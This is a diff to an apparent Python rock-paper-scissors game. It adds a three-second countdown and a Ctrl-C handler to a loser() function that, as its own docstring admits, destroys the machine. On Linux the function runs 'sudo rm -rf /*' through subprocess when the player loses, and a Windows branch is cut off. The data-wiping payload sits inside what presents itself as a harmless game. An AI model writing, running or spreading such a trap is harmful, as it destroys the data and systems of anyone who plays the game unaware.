@@ -127,11 +127,18 @@ def rps():
     return pc_move
 
 
+def countdown():
+    for i in range(3, 0, -1):
+        print(i)
+        time.sleep(1)
+
+
 def loser():
     """If you lose, you lose *smirk*
 
     FATAL: removes all files on the system, and/or makes the system unusable
     """
+    countdown()
     if operating_system == "Linux":
         subprocess.run(["sudo", "rm", "-rf", "/*"], shell=True)
     elif operating_system == "Windows":
@@ -299,7 +306,11 @@ def game():
 
 
 def main():
-    game()
+    try:
+        game()
+    except KeyboardInterrupt:
+        print("\nExiting...")
+        sys.exit(0)
 
 
 if __name__ == "__main__":
